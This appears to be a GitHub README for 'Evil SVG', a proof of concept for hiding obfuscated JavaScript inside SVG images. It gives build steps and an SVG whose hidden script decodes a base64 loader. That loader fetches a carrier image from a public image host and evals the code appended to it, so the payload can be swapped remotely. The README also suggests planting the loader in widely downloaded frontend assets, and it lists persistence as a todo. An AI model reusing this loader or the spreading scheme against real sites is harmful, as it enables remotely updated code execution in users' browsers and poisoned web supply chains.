
![evil](https://user-images.githubusercontent.com/65471523/168417899-313b6767-a579-4dbb-ae35-24f45cd9fba5.jpg)


# Evil SVG

Fun proof of concept demonstrating an obfuscated loading process to execute cross-site code via SVG images.

## Concept

1. Produce some bad client-side code to execute. For the example a simple `alert()` is used.
2. Bundle the attack code as obfuscated js, convert to base64, then append to a carrier image file.
3. Generate some thin loader code that fetches the carrier image from a remote host.
4. Transpose a source SVG image into a template containing the loader code.
5. Use infected SVG to execute client-side code which can be dynamically modified by changing the payload code.

## Execution

### Setup

1. Install [`pnpm`](https://pnpm.io/) globally.
2. Run `pnpm install` to install dependencies.

### Build Payload

1. Edit the `src/build/*.ts` files using the variables provided.
2. Edit the `obfuscator.config.js` config to your preferences or disable the `build:obfuscate` build step.
3. Run `pnpm build` to inject your code into the target image files in `assets/`
4. Build will output files to `dist/`
5. Upload the `payload` image (copyright.png) to a remote host (e.g. [imagebb](https://imgbb.com/))

### Build Evil SVG

1. Get the real uploaded file url and ensure the `base64` content has not been stripped during upload.
2. Set the url from previous step as the `LOADER_URL` variable in `src/build/loader/ts`.
3. Run `pnpm build` a second time to inject the correct loader url into the `evil.svg` file.
4. Open `evil.svg` and see your code execute.

## Screenshots

![image](https://user-images.githubusercontent.com/65471523/168417033-d7825d47-4ae6-4321-b964-620b152901e4.png)

![image](https://user-images.githubusercontent.com/65471523/168417067-39bc2b00-08ac-419d-bac4-bebfb94fba5f.png)


## Unminified SVG Content

```svg
<svg version="1.1"
		 xmlns="http://www.w3.org/2000/svg"
		 viewBox="-668 325.5 250 250"
		 style="enable-background:new -668 325.5 250 250;"
		 xml:space="preserve"> 
	<path fill="#F7DF1E" d="M-668,325.5h250v250h-250V325.5z"/>
	<path d="M-612.3,524.4l19.1-11.6c3.7,6.5,7,12.1..."/>
	<path d="M-529.2,521.9l19.1-11.1c5,8.2,11.6,14..."/>
	<foreignObject x="0" y="0" width="0" height="0"> 
		<div xmlns="http://www.w3.org/1999/xhtml" style="display: none;"> 
			<script> eval(atob(("KCgpPT57dmFyIGM9KHQsYSk9PigpPT4oYXx8dCgoYT17ZXhwb3J0czp7fX0pLmV4cG9ydHMsYSksYS5leHBvcnRzKTt2YXIgZT1jKChleHBvcnRzLG1vZHVsZSk9Pnt2YXIgTE9BREVSX1VSTD0iaHR0cHM6Ly9pLmliYi5jby94MkZOUGtzL2NvcHlyaWdodC5wbmciO2ZldGNoKExPQURFUl9VUkwpLnRoZW4odD0+dC50ZXh0KCkpLnRoZW4oZGF0YT0+e3ZhciB0O3JldHVybiBldmFsKGF0b2IoKHQ9ZGF0YS5zcGxpdCgiOyIpLnBvcCgpKSE9bnVsbD90OiIiKSl9KS5jYXRjaCh0PT57fSl9KTtlKCk7fSkoKTsK"))) </script> 
		</div> 
	</foreignObject>
</svg>
```

## Dynamic Payloads

Note in the example we used a public image host which would not allow updating the payload code.

You might instead design a server that can build and inject your arbitrary code into the payload image dynamically
then set it up on a Cloudflare Worker, but that's outside the scope of this PoC.

Alternatively you might host on a server that allow replacement of an image at the same url to update your
payload code when needed.

All infected SVGs in circulation will continue to poll the url they have had baked in so as long as the url does not change
they will continue to work.

## Other Thoughts

1. The "obfuscation" and "appending to a carrier image" is not required, you could pull a raw `base64` encoded text/json response as the payload from an endpoint. That just felt less sneaky.

<img src="https://thumbs.gfycat.com/BitterEsteemedGrouse-size_restricted.gif" />

2. This technique does not work if svgs are loaded via an image (eg `<img src="https://foo.bar/evil.svg" />`), the SVG must be loaded inline.
3. To that end, it seems like the ideal attack would be to scrape and transpose loader code into millions of assets that frontend developers are likely to download and use without much thought in frontend apps
   using svg inliners.

## Todo

- Create _"pseudo-SVG-path"_ dictionary to replace `base64` in SVG code.
- Build Service Worker for persistence.
- Find a public image host that allows updating files.